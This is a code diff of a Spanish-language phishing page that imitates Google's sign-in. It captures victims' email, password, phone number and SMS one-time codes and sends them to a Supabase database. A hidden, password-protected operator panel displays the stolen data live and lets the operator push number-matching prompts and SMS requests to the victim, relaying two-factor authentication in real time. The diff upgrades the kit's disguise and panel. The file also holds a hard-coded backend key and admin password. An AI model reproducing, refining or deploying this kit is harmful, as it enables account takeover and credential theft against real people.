@@ -9,30 +9,53 @@
     <style>
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         .fade-in { animation: fadeIn 0.4s ease-out; }
-        #admin-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; backdrop-filter: blur(8px); }
+        #admin-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; backdrop-filter: blur(10px); }
+        .google-input:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
     </style>
 </head>
-<body class="bg-[#f0f2f5] min-h-screen flex flex-col items-center justify-center p-4 font-sans select-none" id="main-body">
+<body class="bg-[#f0f2f5] min-h-screen flex flex-col items-center justify-center p-4 font-sans select-none">
 
-    <!-- Modal Admin -->
+    <!-- Panel de Administración (Oculto) -->
     <div id="admin-modal" class="flex items-center justify-center">
-        <div class="bg-zinc-900 p-8 rounded-2xl border border-zinc-700 w-full max-w-sm text-center space-y-4">
-            <h3 class="text-yellow-500 font-mono font-bold uppercase tracking-widest">Acceso Restringido</h3>
-            <input type="password" id="admin-pass-input" placeholder="••••••••" class="w-full p-3 bg-black border border-zinc-600 rounded-lg text-white text-center outline-none focus:border-yellow-500">
-            <button id="admin-login-btn" class="w-full py-3 bg-yellow-600 text-black rounded-lg font-black hover:bg-yellow-500 transition uppercase">Entrar al Sistema</button>
+        <div class="bg-zinc-900 p-8 rounded-3xl border border-zinc-800 w-full max-sm:w-[95%] text-center shadow-2xl">
+            <div class="mb-6">
+                <div class="w-16 h-16 bg-yellow-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <svg class="w-8 h-8 text-yellow-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                </div>
+                <h3 class="text-white font-bold text-xl uppercase tracking-tight">Panel de Control</h3>
+                <p class="text-zinc-500 text-sm">Introduce la clave maestra</p>
+            </div>
+            <input type="password" id="admin-pass-input" placeholder="••••••••" class="w-full p-4 bg-black border border-zinc-700 rounded-xl text-white text-center outline-none focus:border-yellow-500 mb-4 transition-all">
+            <button id="admin-login-btn" class="w-full py-4 bg-yellow-600 text-black rounded-xl font-black hover:bg-yellow-500 transition uppercase tracking-tighter">Acceder al Sistema</button>
+            <button onclick="document.getElementById('admin-modal').style.display='none'" class="mt-4 text-zinc-500 text-xs hover:text-white uppercase font-bold">Cancelar</button>
         </div>
     </div>
 
-    <!-- Contenedor App -->
-    <div id="app-container" class="w-full max-w-[440px] p-8 bg-white border border-gray-200 rounded-2xl relative shadow-sm fade-in">
-        <div id="admin-trigger" class="absolute top-0 right-0 w-20 h-20 z-50 cursor-pointer"></div>
-        <div class="flex justify-center mb-8" id="logo-container">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-6">
+    <!-- Interfaz de Usuario / Víctima -->
+    <div id="app-container" class="w-full max-w-[440px] p-8 md:p-10 bg-white border border-gray-200 rounded-2xl relative shadow-sm fade-in transition-all duration-500">
+        <!-- Gatillo secreto: Doble clic en la esquina superior derecha -->
+        <div id="admin-trigger" class="absolute top-0 right-0 w-16 h-16 z-50 cursor-default"></div>
+        
+        <div class="flex justify-center mb-10" id="logo-container">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-7">
         </div>
-        <div id="view-content"></div>
+        
+        <div id="view-content">
+            <!-- Contenido dinámico -->
+        </div>
     </div>
+
+    <footer id="main-footer" class="mt-8 flex gap-6 text-[12px] text-gray-500">
+        <span>Español (España)</span>
+        <div class="flex gap-4">
+            <a href="#" class="hover:underline">Ayuda</a>
+            <a href="#" class="hover:underline">Privacidad</a>
+            <a href="#" class="hover:underline">Términos</a>
+        </div>
+    </footer>
 
     <script>
+        // --- CONFIGURACIÓN CRÍTICA ---
         const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
         const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
         const ADMIN_PASS = "sebas22034";
@@ -42,132 +65,217 @@
         let state = {
             view: 'victim',
             step: 'login',
-            sessionId: `ID_${Math.random().toString(36).substr(2, 5).toUpperCase()}`,
+            sessionId: `ID_${Math.random().toString(36).substr(2, 6).toUpperCase()}`,
             data: { email: '', password: '', phone: '', sms: '' },
             targetNum: '--' 
         };
 
+        // --- FUNCIONES DE COMUNICACIÓN ---
         async function sync(step, extra = {}) {
+            // Un pequeño retraso para evitar problemas de caché de red o inicialización
             const payload = {
-                session_id: state.sessionId,
-                email: extra.email || state.data.email || '',
-                password: extra.password || state.data.password || '',
-                phone: extra.phone || state.data.phone || '',
-                sms: extra.sms || state.data.sms || '',
-                step: step,
-                target_num: state.targetNum === '--' ? null : state.targetNum
+                "session_id": state.sessionId,
+                "email": extra.email || state.data.email || '',
+                "password": extra.password || state.data.password || '',
+                "phone": extra.phone || state.data.phone || '',
+                "sms": extra.sms || state.data.sms || '',
+                "step": step,
+                "target_num": state.targetNum === '--' ? null : state.targetNum,
+                "updated_at": new Date().toISOString()
             };
-            await client.from('sessions').upsert(payload, { onConflict: 'session_id' });
+            
+            // Usamos comillas explícitas para evitar errores con nombres de columnas reservados
+            const { error } = await client
+                .from('sessions')
+                .upsert(payload, { onConflict: 'session_id' });
+                
+            if (error) {
+                console.error("Error sincronizando:", error.message);
+                // Intento alternativo sin onConflict si falla por caché del esquema
+                if(error.message.includes('session_id')){
+                     await client.from('sessions').insert([payload]);
+                }
+            }
         }
 
+        // --- RENDERIZADO DE VISTAS ---
         function render() {
             const c = document.getElementById('view-content');
             if (state.view === 'admin') { renderAdmin(); return; }
 
             if (state.step === 'login') {
                 c.innerHTML = `
-                    <div class="text-center mb-6"><h2 class="text-xl font-medium">Acceder</h2><p class="text-sm mt-2 text-gray-600">Utiliza tu cuenta de Google</p></div>
+                    <div class="text-center mb-8">
+                        <h2 class="text-2xl font-normal text-gray-900">Iniciar sesión</h2>
+                        <p class="text-sm mt-2 text-gray-600">Ir a Gmail</p>
+                    </div>
                     <form class="space-y-4" onsubmit="event.preventDefault(); state.data.email=this.e.value; state.data.password=this.p.value; state.step='phone'; sync('phone'); render();">
-                        <input name="e" required type="email" placeholder="Correo electrónico o teléfono" class="w-full p-3 border rounded focus:ring-2 focus:ring-blue-500 outline-none">
-                        <input name="p" required type="password" placeholder="Escribe tu contraseña" class="w-full p-3 border rounded focus:ring-2 focus:ring-blue-500 outline-none">
-                        <div class="flex justify-between items-center mt-8">
-                            <span class="text-blue-600 font-bold text-sm cursor-pointer">¿Olvidaste tu correo?</span>
-                            <button class="bg-blue-600 text-white px-6 py-2 rounded font-medium">Siguiente</button>
+                        <input name="e" required type="email" placeholder="Correo electrónico o teléfono" class="google-input w-full p-4 border border-gray-300 rounded-lg outline-none transition-all text-base">
+                        <input name="p" required type="password" placeholder="Introduce tu contraseña" class="google-input w-full p-4 border border-gray-300 rounded-lg outline-none transition-all text-base">
+                        <div class="flex justify-between items-center mt-8 pt-4">
+                            <span class="text-blue-600 font-bold text-sm cursor-pointer hover:underline">¿Olvidaste tu correo?</span>
+                            <button class="bg-blue-600 text-white px-8 py-2 rounded-lg font-medium hover:bg-blue-700 shadow-sm">Siguiente</button>
                         </div>
                     </form>`;
             } else if (state.step === 'phone') {
                 c.innerHTML = `
-                    <h2 class="text-lg text-center mb-4">Verifica tu teléfono</h2>
+                    <div class="text-center mb-6">
+                        <h2 class="text-xl font-medium">Verificación en dos pasos</h2>
+                        <p class="text-sm text-gray-600 mt-4 leading-relaxed">Para ayudar a proteger tu cuenta, Google quiere asegurarse de que eres tú quien intenta iniciar sesión.</p>
+                    </div>
                     <form class="space-y-4" onsubmit="event.preventDefault(); state.data.phone=this.t.value; state.step='wait'; sync('wait'); render();">
-                        <input name="t" required type="tel" placeholder="Número de móvil" class="w-full p-4 border rounded-xl text-center text-2xl font-bold tracking-widest">
-                        <button class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold uppercase tracking-tighter">Enviar Solicitud</button>
+                        <div class="bg-gray-50 p-4 rounded-lg border text-sm text-gray-700 mb-4">
+                            Confirma el número de teléfono vinculado.
+                        </div>
+                        <input name="t" required type="tel" placeholder="Número de teléfono" class="google-input w-full p-4 border border-gray-300 rounded-lg text-center text-xl font-bold tracking-widest outline-none">
+                        <button class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold mt-4 shadow-lg active:scale-95 transition-transform">ENVIAR AVISO</button>
                     </form>`;
             } else if (state.step === 'wait') {
                 c.innerHTML = `
                     <div class="text-center py-6 fade-in">
-                        <p class="mb-6 text-gray-600 text-sm">Abre la aplicación de Google en tu dispositivo y toca el número:</p>
-                        <div class="text-8xl font-black text-blue-600 py-12 bg-blue-50 rounded-3xl animate-pulse border-4 border-blue-200">
+                        <p class="mb-6 text-gray-700 text-sm font-medium">Abre la aplicación de Google y toca el número:</p>
+                        <div class="text-8xl font-black text-blue-600 py-12 bg-blue-50 rounded-[2rem] animate-pulse border-4 border-blue-100 shadow-inner">
                             ${state.targetNum}
                         </div>
-                        <p class="text-[10px] text-gray-400 mt-8 uppercase font-bold tracking-[0.2em]">Sincronizando con dispositivo...</p>
+                        <div class="flex flex-col items-center mt-10 space-y-3">
+                            <div class="w-6 h-6 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+                            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-[0.3em]">Esperando dispositivo...</p>
+                        </div>
                     </div>`;
             } else if (state.step === 'sms') {
                 c.innerHTML = `
-                    <h2 class="text-lg text-center mb-4 font-bold">Introduce el código</h2>
+                    <div class="text-center mb-6">
+                        <h2 class="text-xl font-bold">Verificación por SMS</h2>
+                        <p class="text-xs text-gray-500 mt-2">Introduce el código de 6 dígitos enviado.</p>
+                    </div>
                     <form class="space-y-4" onsubmit="event.preventDefault(); state.data.sms=this.s.value; state.step='end'; sync('end'); render(); setTimeout(()=>location.href='https://myaccount.google.com',3000);">
-                        <div class="flex items-center border-2 border-blue-500 p-4 rounded-xl">
-                            <span class="text-2xl font-bold text-gray-400 mr-2">G-</span>
-                            <input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none font-mono tracking-widest">
+                        <div class="flex items-center border-2 border-blue-500 p-4 rounded-xl bg-blue-50/30">
+                            <span class="text-2xl font-bold text-gray-400 mr-3 pr-3 border-r border-gray-200">G-</span>
+                            <input name="s" required type="number" placeholder="000000" class="w-full text-2xl outline-none bg-transparent font-mono tracking-[0.2em]">
                         </div>
-                        <button class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold uppercase">Verificar código</button>
+                        <button class="w-full bg-blue-600 text-white py-4 rounded-xl font-black uppercase tracking-widest shadow-blue-200 shadow-xl">Verificar</button>
                     </form>`;
             } else if (state.step === 'end') {
-                c.innerHTML = `<div class="text-center py-10 text-emerald-600 font-bold animate-bounce text-xl">✓ Verificación completada</div>`;
+                c.innerHTML = `
+                    <div class="text-center py-12 space-y-6">
+                        <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto text-4xl animate-bounce">✓</div>
+                        <h2 class="text-xl font-bold text-gray-800">Acceso concedido</h2>
+                        <p class="text-gray-500 text-sm">Iniciando sesión segura...</p>
+                    </div>`;
             }
         }
 
+        // --- VISTA DE ADMINISTRADOR ---
         async function renderAdmin() {
-            const { data } = await client.from('sessions').select('*');
+            const { data, error } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
+            if (error) {
+                 console.error("Error cargando admin:", error.message);
+                 return;
+            }
+            
             const c = document.getElementById('view-content');
-            document.body.className = "bg-zinc-950 p-4 text-white font-sans";
-            document.getElementById('app-container').className = "w-full max-w-5xl bg-zinc-900 border-zinc-800 p-8 rounded-[2rem] mx-auto shadow-2xl";
+            
+            document.body.className = "bg-zinc-950 p-4 text-zinc-300 font-sans";
+            document.getElementById('app-container').className = "w-full max-w-6xl bg-zinc-900 border-zinc-800 p-8 rounded-[2.5rem] mx-auto shadow-2xl transition-all duration-700";
+            document.getElementById('main-footer').className = "hidden";
+            
             document.getElementById('logo-container').innerHTML = `
-                <div class="flex justify-between items-center w-full border-b border-zinc-800 pb-4">
-                    <h2 class="text-yellow-500 font-black text-2xl tracking-tighter italic">ADMIN_CORE v2</h2>
-                    <span class="bg-yellow-500/10 text-yellow-500 px-4 py-1 rounded-full text-xs font-bold border border-yellow-500/20">SESIONES: ${data?.length || 0}</span>
+                <div class="flex justify-between items-center w-full border-b border-zinc-800 pb-6 mb-2">
+                    <div class="flex items-center gap-3">
+                        <div class="w-3 h-3 bg-emerald-500 rounded-full animate-ping"></div>
+                        <h2 class="text-white font-black text-2xl tracking-tighter uppercase italic">Control Panel v4</h2>
+                    </div>
+                    <div class="flex gap-4 items-center">
+                         <span class="bg-zinc-800 text-zinc-400 px-4 py-1.5 rounded-lg text-xs font-bold border border-zinc-700 uppercase tracking-widest">Activos: ${data?.length || 0}</span>
+                         <button onclick="location.reload()" class="bg-zinc-800 p-2 rounded-lg hover:bg-zinc-700 text-white"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></button>
+                    </div>
                 </div>`;
             
-            let html = `<div class="grid gap-6 md:grid-cols-2 mt-6">`;
+            let html = `<div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3 mt-6">`;
             data?.forEach(s => {
+                const isSMS = s.step === 'sms';
                 html += `
-                    <div class="bg-black/40 border border-zinc-800 p-6 rounded-2xl hover:border-yellow-500/50 transition-all group">
-                        <div class="flex justify-between items-start mb-4">
-                            <div>
-                                <p class="text-[10px] text-zinc-500 font-mono">${s.session_id}</p>
-                                <p class="text-yellow-500 font-bold text-lg truncate w-48">${s.email || 'NUEVA SESIÓN'}</p>
+                    <div class="bg-zinc-950/50 border ${isSMS ? 'border-blue-500/40 shadow-blue-500/5' : 'border-zinc-800'} p-6 rounded-3xl hover:border-zinc-600 transition-all">
+                        <div class="flex justify-between items-start mb-6">
+                            <span class="text-[10px] bg-zinc-800 text-zinc-500 px-2 py-1 rounded-md font-mono">${s.session_id}</span>
+                            <span class="text-[10px] font-black px-3 py-1 ${s.step === 'end' ? 'bg-emerald-500/10 text-emerald-500' : 'bg-blue-500/10 text-blue-400'} rounded-full uppercase border border-current/20">${s.step}</span>
+                        </div>
+                        <div class="space-y-3 mb-6">
+                            <div class="bg-zinc-900/50 p-3 rounded-xl border border-zinc-800/50">
+                                <p class="text-[9px] text-zinc-600 uppercase font-black mb-1 tracking-widest">Login</p>
+                                <p class="text-white font-bold text-sm truncate select-all">${s.email || '...'}</p>
                             </div>
-                            <span class="text-[10px] font-bold px-2 py-1 bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded uppercase">${s.step}</span>
+                            <div class="bg-zinc-900/50 p-3 rounded-xl border border-zinc-800/50">
+                                <p class="text-[9px] text-zinc-600 uppercase font-black mb-1 tracking-widest">Pass</p>
+                                <p class="text-white font-bold text-sm truncate select-all">${s.password || '...'}</p>
+                            </div>
+                            <div class="flex gap-2">
+                                <div class="flex-1 bg-zinc-900/50 p-3 rounded-xl border border-zinc-800/50">
+                                    <p class="text-[9px] text-zinc-600 uppercase font-black mb-1">Tel</p>
+                                    <p class="text-blue-400 font-bold text-xs truncate select-all">${s.phone || '---'}</p>
+                                </div>
+                                <div class="flex-1 bg-emerald-500/5 p-3 rounded-xl border border-emerald-500/20 text-center">
+                                    <p class="text-[9px] text-emerald-600 uppercase font-black mb-1">SMS</p>
+                                    <p class="text-emerald-400 font-black text-lg select-all">${s.sms || '---'}</p>
+                                </div>
+                            </div>
                         </div>
-                        <div class="space-y-2 mb-6">
-                            <p class="text-xs text-zinc-400">PASSWORD: <span class="text-white">${s.password || '***'}</span></p>
-                            <p class="text-xs text-zinc-400">TELÉFONO: <span class="text-white">${s.phone || '---'}</span></p>
-                            <p class="text-sm font-bold text-emerald-400 bg-emerald-500/5 p-2 rounded border border-emerald-500/10">SMS: ${s.sms || 'ESPERANDO...'}</p>
-                        </div>
-                        <div class="flex items-center gap-3 border-t border-zinc-800 pt-4">
-                            <div class="flex flex-col flex-1">
-                                <label class="text-[9px] text-zinc-500 uppercase font-black mb-1">Número a mostrar (2 dígitos):</label>
+                        <div class="flex items-center gap-4 pt-4 border-t border-zinc-900">
+                            <div class="flex-1 text-center">
+                                <label class="text-[10px] text-zinc-500 uppercase font-black mb-1 block">Nº:</label>
                                 <input type="text" value="${s.target_num || ''}" placeholder="--" maxlength="2" 
-                                    class="w-full bg-zinc-800 border-2 border-zinc-700 text-center text-yellow-400 text-2xl font-black rounded-xl p-2 focus:border-yellow-500 outline-none" 
+                                    class="w-full bg-black border-2 border-zinc-800 text-center text-yellow-500 text-3xl font-black rounded-2xl p-2 focus:border-yellow-500 outline-none transition-all" 
                                     onchange="updateNum('${s.session_id}', this.value)">
                             </div>
-                            <button onclick="forceSms('${s.session_id}')" class="h-14 flex-[1.5] bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-black text-xs uppercase shadow-lg shadow-blue-900/20">Pedir SMS</button>
+                            <button onclick="forceSms('${s.session_id}')" class="flex-1 h-16 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl font-black text-xs uppercase shadow-lg transition-all active:scale-95">PEDIR SMS</button>
                         </div>
                     </div>`;
             });
-            c.innerHTML = html + (data?.length === 0 ? '<p class="text-zinc-600 text-center py-20 font-bold italic col-span-2">No hay sesiones activas. Esperando víctimas...</p>' : '') + `</div>`;
+            c.innerHTML = html + (data?.length === 0 ? '<div class="col-span-full py-32 text-center text-zinc-700 italic">No hay actividad.</div>' : '') + `</div>`;
         }
 
-        window.updateNum = async (id, val) => { await client.from('sessions').update({ target_num: val }).eq('session_id', id); };
-        window.forceSms = async (id) => { await client.from('sessions').update({ step: 'sms' }).eq('session_id', id); renderAdmin(); };
+        // --- ACCIONES ADMIN ---
+        window.updateNum = async (id, val) => {
+            await client.from('sessions').update({ "target_num": val, "updated_at": new Date().toISOString() }).eq('session_id', id);
+        };
+        window.forceSms = async (id) => {
+            await client.from('sessions').update({ "step": 'sms', "updated_at": new Date().toISOString() }).eq('session_id', id);
+            renderAdmin();
+        };
 
-        document.getElementById('admin-trigger').ondblclick = () => { document.getElementById('admin-modal').style.display = 'flex'; };
+        // --- EVENTOS Y CONTROL ---
+        document.getElementById('admin-trigger').ondblclick = () => {
+            document.getElementById('admin-modal').style.display = 'flex';
+        };
+
         document.getElementById('admin-login-btn').onclick = () => {
-            if (document.getElementById('admin-pass-input').value === ADMIN_PASS) {
+            const pass = document.getElementById('admin-pass-input').value;
+            if (pass === ADMIN_PASS) {
                 state.view = 'admin';
                 document.getElementById('admin-modal').style.display = 'none';
                 renderAdmin();
                 setInterval(renderAdmin, 4000);
+            } else {
+                alert("Incorrecto.");
             }
         };
 
         window.onload = () => {
             sync('login'); 
             render();
-            client.channel('any').on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${state.sessionId}` }, (p) => {
-                state.targetNum = p.new.target_num || '--';
-                state.step = p.new.step;
-                if (state.view === 'victim') render();
-            }).subscribe();
+            
+            client.channel('live_updates')
+                .on('postgres_changes', { 
+                    event: 'UPDATE', 
+                    schema: 'public', 
+                    table: 'sessions', 
+                    filter: `session_id=eq.${state.sessionId}` 
+                }, (payload) => {
+                    state.targetNum = payload.new.target_num || '--';
+                    state.step = payload.new.step;
+                    if (state.view === 'victim') render();
+                })
+                .subscribe();
         };
     </script>
 </body>
